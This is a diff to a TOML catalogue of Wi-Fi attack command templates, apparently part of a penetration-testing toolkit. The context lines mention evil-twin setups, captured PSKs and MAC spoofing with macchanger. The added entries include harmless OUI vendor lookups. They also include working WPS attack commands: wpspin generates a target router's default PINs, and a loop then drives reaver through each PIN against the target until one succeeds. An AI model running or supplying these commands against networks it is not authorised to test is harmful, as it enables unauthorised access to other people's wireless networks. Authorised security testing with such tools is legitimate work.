@@ -10,6 +10,7 @@ order = 12
 #   password=…  — target/captured PSK (cred profile or :variable); not spray_password
 #   evil_twin_psk=WrongPassword123  eap_tls_key_pass=whatever
 #   eap=PEAP  phase2=mschapv2  cert_dir=/tmp/certs
+#   oui=60-38-E0  oui_db=/var/lib/ieee-data/oui.txt  (optional; lookup tries common paths)
 
 # === Host / interface enumeration ===
 
@@ -111,6 +112,38 @@ title = "macchanger — spoof to {station} (client clone)"
 template = "sudo macchanger -m {station} {iface}"
 requires = ["macchanger"]
 tags = ["mac", "opsec"]
+
+[[command]]
+id = "wifi.oui.lookup"
+title = "OUI vendor — grep ieee-data from {bssid}"
+template = """OUI=$(printf '%s\\n' '{bssid}' | tr '[:lower:]' '[:upper:]' | cut -d: -f1-3 | tr ':' '-') && \\
+for OUI_DB in /var/lib/ieee-data/oui.txt /usr/share/ieee-data/oui.txt; do \\
+  test -f \"$OUI_DB\" && break; \\
+done && \\
+test -f \"$OUI_DB\" || {{ echo 'OUI database not found (install ieee-data / ieee-data-oui36)'; exit 1; }} && \\
+echo \"OUI prefix: $OUI\" && grep -i \"$OUI\" \"$OUI_DB\""""
+tags = ["enum", "mac", "oui", "vendor"]
+
+[[command]]
+id = "wifi.oui.lookup.station"
+title = "OUI vendor — grep ieee-data from {station} MAC"
+template = """OUI=$(printf '%s\\n' '{station}' | tr '[:lower:]' '[:upper:]' | cut -d: -f1-3 | tr ':' '-') && \\
+for OUI_DB in /var/lib/ieee-data/oui.txt /usr/share/ieee-data/oui.txt; do \\
+  test -f \"$OUI_DB\" && break; \\
+done && \\
+test -f \"$OUI_DB\" || {{ echo 'OUI database not found (install ieee-data / ieee-data-oui36)'; exit 1; }} && \\
+echo \"OUI prefix: $OUI\" && grep -i \"$OUI\" \"$OUI_DB\""""
+tags = ["enum", "mac", "oui", "vendor"]
+
+[[command]]
+id = "wifi.oui.grep"
+title = "OUI vendor — grep ieee-data for {oui} (e.g. 60-38-E0)"
+template = """for OUI_DB in /var/lib/ieee-data/oui.txt /usr/share/ieee-data/oui.txt; do \\
+  test -f \"$OUI_DB\" && break; \\
+done && \\
+test -f \"$OUI_DB\" || {{ echo 'OUI database not found (install ieee-data / ieee-data-oui36)'; exit 1; }} && \\
+grep -i '{oui}' \"$OUI_DB\""""
+tags = ["enum", "mac", "oui", "vendor"]
 
 # === Monitor mode (airmon-ng / iw) ===
 
@@ -792,6 +825,35 @@ test -n "$PIN" && sudo reaver -i {mon_iface} -b {bssid} -p "$PIN" -vv || \\
 echo 'No suggested PIN from wpspin; run wifi.wpspin or wifi.wpspin.all'"""
 requires = ["wpspin", "reaver"]
 tags = ["wps", "wpspin", "reaver"]
+
+[[command]]
+id = "wifi.wpspin.pins"
+title = "wpspin — extract unique 8-digit PINs (-A, one per line)"
+template = "wpspin -A {bssid} 2>/dev/null | grep -oE '[0-9]{{8}}' | sort -u"
+requires = ["wpspin"]
+tags = ["wps", "wpspin", "offline"]
+
+[[command]]
+id = "wifi.wpspin.pins.oneline"
+title = "wpspin — unique PINs as one line (for scripts)"
+template = "wpspin -A {bssid} 2>/dev/null | grep -oE '[0-9]{{8}}' | sort -u | tr '\\n' ' ' && echo"
+requires = ["wpspin"]
+tags = ["wps", "wpspin", "offline"]
+
+[[command]]
+id = "wifi.wpspin.reaver.each"
+title = "wpspin + reaver — try every generated PIN (1 attempt each)"
+template = """PINS=$(wpspin -A {bssid} 2>/dev/null | grep -oE '[0-9]{{8}}' | sort -u) && \\
+if [ -z \"$PINS\" ]; then echo 'No PINs from wpspin -A {bssid}'; exit 1; fi && \\
+for PIN in $PINS; do \\
+  echo \"Attempting PIN: $PIN\"; \\
+  sudo reaver --max-attempts=1 -l 100 -r 3:45 -i {mon_iface} -b {bssid} -c {channel} -p \"$PIN\" -vv && \\
+  {{ echo \"WPS PIN found: $PIN\"; break; }}; \\
+done; \\
+echo 'PIN guesses complete'"""
+requires = ["wpspin", "reaver"]
+tags = ["wps", "wpspin", "reaver", "chain"]
+interactive = true
 
 # === airolib-ng (precomputed PMK) ===
 
